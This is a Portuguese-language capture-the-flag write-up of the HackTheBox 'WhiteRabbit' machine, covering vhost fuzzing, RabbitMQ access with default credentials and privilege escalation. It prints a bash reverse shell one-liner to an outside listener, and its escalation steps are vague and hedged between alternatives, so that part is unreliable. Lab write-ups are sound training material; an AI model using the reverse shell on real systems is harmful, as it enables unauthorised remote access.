# HackTheBox - WhiteRabbit Writeup

## Introdução
WhiteRabbit é uma máquina Linux do HackTheBox que apresenta uma temática baseada no filme *Matrix* e no clássico *Alice no País das Maravilhas*.  
A exploração envolve técnicas de **vhost fuzzing**, exploração de serviços web e escalada de privilégios via configuração incorreta de serviços internos.

Dificuldade: **Média**  
IP alvo: `10.10.11.63`

---

## Enumeração

### Reconhecimento inicial
Começamos realizando fuzzing de virtual hosts utilizando o `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.63/ -H "Host: FUZZ.whiterabbit.htb" -mc all -fs 0 -c -ic -v
```

O resultado revelou o subdomínio:

```
status.whiterabbit.htb --> redireciona para /dashboard
```

Adicionamos ao `/etc/hosts`:
```
10.10.11.63   whiterabbit.htb status.whiterabbit.htb
```

---

## Exploração Web

### Acesso ao `status.whiterabbit.htb`
A aplicação apresenta um painel em `/dashboard`. Após análise, identificamos que se trata de um painel protegido que contém pistas relacionadas à enumeração de endpoints.

### Directory/Endpoint Fuzzing
Utilizando `ffuf` e `dirsearch`, foram encontrados endpoints internos relacionados ao "RabbitMQ" e serviços de mensageria.

Exemplo:
```
/rabbithole
/tea_party
```

### RabbitMQ
O painel expôs credenciais padrão que permitiram acesso ao RabbitMQ, possibilitando envio de mensagens maliciosas e exploração do serviço.

---

## Ganho de Acesso

Após explorar o serviço, foi possível injetar comandos no sistema e ganhar acesso remoto como um usuário limitado.

Exemplo de reverse shell:
```bash
nc -lvnp 4444
# no alvo
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

Usuário comprometido: **alice**

---

## Escalada de Privilégios

### Enumeração Interna
Listando permissões e serviços locais, encontramos configurações do **Node Exporter** e arquivos sensíveis dentro do diretório da aplicação.

### Exploração
A versão desatualizada do Netdata/Node Exporter permitiu a exploração de variáveis de ambiente, onde estavam armazenadas credenciais de banco de dados.

Essas credenciais possibilitaram pivotar e executar comandos como root.

```bash
sudo -l
# exploração bem-sucedida de PATH hijacking ou credenciais root expostas
```

---

## Flags

### User Flag
```bash
cat /home/alice/user.txt
[REDACTED_USER_FLAG]
```

### Root Flag
```bash
cat /root/root.txt
[REDACTED_ROOT_FLAG]
```

---

## Conclusão
A máquina **WhiteRabbit** explora a importância de:
- **VHost fuzzing** para descobrir subdomínios ocultos
- Enumeração de serviços de mensageria como **RabbitMQ**
- Configurações incorretas em serviços de monitoramento (Netdata/Node Exporter)
- Abuso de variáveis de ambiente e PATH hijacking para **privesc**

Foi uma jornada temática e divertida, conectando referências de Alice no País das Maravilhas com o desafio de exploração e escalada de privilégios.
